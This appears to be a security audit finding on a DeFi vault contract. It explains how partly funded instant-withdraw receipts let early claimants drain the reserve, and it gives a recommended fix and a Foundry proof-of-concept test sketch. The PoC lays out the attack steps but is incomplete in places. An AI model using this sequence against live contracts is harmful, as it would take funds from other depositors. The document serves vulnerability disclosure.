### Title
Instant-withdraw claims pay the full aggregate receipt without checking it was actually funded — first claimants drain the strategy's reserve and leave later instant claimants unpaid - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`claimInstantWithdrawRequest` burns a user's entire `instantWithdrawsRequests[_user]` balance and transfers the same amount of underlyings, without verifying that the strategy actually received funding for that amount via `collectInstantWithdrawFunds`. Funding is tracked only globally (`pendingInstantWithdraws` decremented on collection), never per claim. This mirrors the report's missing `zProceed <= I` reserve check: the payout is computed from the receipt, not from the funded reserve.

### Finding Description
- `requestInstantWithdraw` mints a 1:1 strategy-token receipt and adds to both `instantWithdrawsRequests[_user]` and `pendingInstantWithdraws` (contracts/strategies/idle/IdleCreditVault.sol:356-375).
- At `startEpoch`, IdleCDO calls `collectInstantWithdrawFunds(min(pendingInstant, totUnderlyings))`; if `pendingInstant > totUnderlyings` the strategy receives only a partial transfer while `pendingInstantWithdraws` retains the unfunded remainder (contracts/IdleCDOEpochVariant.sol:279-290, contracts/strategies/idle/IdleCreditVault.sol:398-403).
- `claimInstantWithdrawRequest` then does `_burn(_user, amount)` + `_transferFundedClaim(_user, amount)` for the *entire* `instantWithdrawsRequests[_user]` — including any unfunded remainder — once `allowInstantWithdraw` is enabled by the CDO (contracts/strategies/idle/IdleCreditVault.sol:380-393, contracts/IdleCDOEpochVariant.sol:975-978).
- `_transferFundedClaim` only guards that the transfer does not dip into `defaultRecoveryReserve`; it does not check that this user's receipt was covered by collected funds (contracts/strategies/idle/IdleCreditVault.sol:897-907).
- The same aggregate-vs-funded gap compounds across epochs: `instantWithdrawsRequests[_user]` accumulates all of a user's requests, so a single claim pays out receipts from multiple epochs even when only part of the aggregate was funded.

### Impact Explanation
When instant requests are only partially funded (new deposits at `startEpoch` cover less than `pendingInstant`), any claimant whose claims are enabled can withdraw their *full* receipt amount, not just their pro-rata funded share. Early claimants drain the strategy's underlying balance — including funds that belong to other instant claimants — and later claimants' `_burn`/transfer either reverts or pays nothing. This is direct theft of unfunded receipts up to the unfunded remainder of `pendingInstantWithdraws`, bounded by the strategy's underlying balance, plus permanent loss for the remaining receipt holders (one-receipt-one-payout and solvency invariants broken).

### Likelihood Explanation
Requires an epoch where instant withdrawals are enabled (APR dropped by more than `instantWithdrawAprDelta`) and `pendingInstant > totUnderlyings` at `startEpoch`, followed by `allowInstantWithdraw` being turned on (e.g. after `instantWithdrawDeadline` / the close-pool path where `allowInstantWithdraw = _isRequestingAllFunds`). The attacker is an ordinary KYC-passed tranche holder; no privileged action is needed beyond requesting a withdraw and being the first to claim. The missing check is unconditional — there is no per-user funded bound anywhere in the claim path.

### Recommendation
Track the funded portion of instant receipts explicitly (e.g. a `fundedInstantWithdraws` counter increased in `collectInstantWithdrawFunds`, or a per-epoch funded price like `lossRecoveryPriceByEpoch`), and in `claimInstantWithdrawRequest` cap each user's payout to their funded share — paying pro rata via a stored `instantRecoveryPrice` per epoch when funding is partial — rather than paying the full `instantWithdrawsRequests[_user]` aggregate. Equivalently, revert claims while `pendingInstantWithdraws != 0` for the relevant epoch.

### Proof of Concept
Foundry fork PoC sketch (structure mirrors `test/foundry/IdleCreditVault.t.sol::testClaimInstantWithdrawRequest`):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

function testPartiallyFundedInstantClaimDrainsReserve() external {
    // Setup: attacker (user1) and victim (user2) both hold AA tranche tokens.
    uint256 amountWei = 10_000 * ONE_SCALE;
    _depositWithUser(user1, amountWei, false);
    _depositWithUser(user2, amountWei, false);

    // Epoch 0 runs, then stopEpoch sets a LOWER apr so instant withdrawals unlock.
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr / 4, _expectedFundsEndEpoch());

    // During buffer both users request instant withdraw (full balance, _amount = 0).
    vm.prank(user1);
    uint256 req1 = cdoEpoch.requestWithdraw(0, address(AAtranche));
    vm.prank(user2);
    uint256 req2 = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // Attacker also deposits dust so totUnderlyings > 0 but << pendingInstant.
    // i.e. buffer deposits cover only a fraction of pending instant requests.
    deal(defaultUnderlying, attacker, req1 / 10);
    vm.prank(attacker);
    idleCDO.depositAA(req1 / 10);

    // startEpoch: pendingInstant > totUnderlyings -> strategy only partially funded.
    _startEpochAndCheckPrices(1);
    IdleCreditVault strat = IdleCreditVault(address(strategy));
    assertGt(strat.pendingInstantWithdraws(), 0, "unfunded remainder exists");

    // allowInstantWithdraw becomes true once claims are enabled
    // (after instantWithdrawDeadline / close-pool path).
    vm.warp(cdoEpoch.instantWithdrawDeadline() + 1);
    // (enable per the variant's claim-enable path)

    // Attacker claims FIRST and receives the FULL receipt amount, not a pro-rata share.
    uint256 balPre = underlying.balanceOf(user1);
    vm.prank(user1);
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(underlying.balanceOf(user1) - balPre, req1, "attacker paid in full");

    // Victim's claim now fails / pays far less because the strategy balance was drained.
    vm.prank(user2);
    vm.expectRevert(); // ERC20 transfer underflow on strategy balance
    cdoEpoch.claimInstantWithdrawRequest();
}
```

Uncertainty: the exact step that re-enables `allowInstantWithdraw` after a partially funded `startEpoch` (deadline-based path vs `stopEpoch(…, 1)` close-pool path at contracts/IdleCDOEpochVariant.sol:486) should be confirmed against `getInstantWithdrawFunds` in the variant; the core defect — `claimInstantWithdrawRequest` paying the unbounded aggregate receipt with no funded-share check — is visible directly in contracts/strategies/idle/IdleCreditVault.sol:380-393.